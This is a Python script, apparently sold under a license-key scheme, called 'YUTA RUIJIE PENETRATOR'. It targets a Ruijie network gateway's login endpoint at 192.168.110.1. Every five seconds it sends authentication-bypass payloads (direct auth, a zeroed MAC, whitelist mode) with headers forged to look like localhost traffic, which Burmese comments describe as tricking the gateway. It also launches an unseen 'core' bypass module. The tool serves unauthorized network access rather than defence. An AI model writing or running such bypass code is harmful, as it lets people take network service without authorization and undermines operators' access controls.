import sys, os, hashlib, subprocess, datetime, requests, time, threading
from colorama import Fore, init

init(autoreset=True)

# --- LICENSE SYSTEM ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except: return datetime.datetime.now()

def get_hwid():
    try:
        user = subprocess.check_output(['whoami']).decode().strip()
    except: user = "user"
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def check_access():
    uid = get_hwid()
    now = get_net_time()
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
            for i in range(0, 366):
                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                    return True
    
    os.system('clear')
    print(f"{Fore.CYAN}--- YUTA RUIIJE PENETRATOR ---")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    u_key = input(f"\n{Fore.WHITE}ENTER KEY: ").strip()
    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if u_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f: f.write(u_key)
            return True
    return False

# --- ADVANCED SPOOFING INJECTOR ---
def ruijie_spoof_inject(host):
    # Gateway ကို လှည့်စားဖို့ နောက်ဆုံးပေါ် header များ
    url = f"http://{host}/login/auth"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
        "X-Forwarded-For": "127.0.0.1", # Localhost ကနေ လာသလိုမျိုး လိမ်တာ
        "X-Real-IP": "127.0.0.1",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    # Ruijie Update တွေမှာ သုံးတဲ့ Direct Bypass payloads
    payloads = [
        "auth_type=direct&mode=1&is_confirm=1",
        "auth_type=mac_auth&user_mac=00:00:00:00:00:00",
        "auth_type=white_list" 
    ]
    
    while True:
        for data in payloads:
            try:
                # Gateway ဆီကို ၅ စက္ကန့်တစ်ခါ အတင်းဝင်ခိုင်းမယ်
                requests.post(url, data=data, headers=headers, timeout=2)
            except: pass
        time.sleep(5)

def start_engine():
    os.system('clear')
    target = "192.168.110.1"
    print(f"{Fore.CYAN}--- YUTA RUJIE DIRECT BYPASS ---")
    print(f"{Fore.YELLOW}[*] TARGETING GATEWAY: {target}")

    try:
        sys.path.append(os.getcwd())
        import core
        core.IS_LIFETIME = True
        
        # ၁။ Core Engine ကို Background မှာ နှိုးမယ်
        print(f"{Fore.BLUE}[*] Launching Core Engine...")
        t1 = threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True)
        t1.start()
        
        # ၂။ Spoof Injector ကို နှိုးမယ်
        print(f"{Fore.MAGENTA}[*] Injecting Spoofed Headers...")
        t2 = threading.Thread(target=ruijie_spoof_inject, args=(target,), daemon=True)
        t2.start()
        
        print(f"{Fore.GREEN}\n[✔] ENGINE RUNNING... PLEASE WAIT 10-20 SECONDS.")
        while True:
            # စက္ကန့်တိုင်း Check လုပ်နေမယ်
            time.sleep(1)
            
    except Exception as e:
        print(f"{Fore.RED}[✘] Fatal Error: {e}")

if __name__ == "__main__":
    if check_access():
        start_engine()
    else:
        sys.exit()
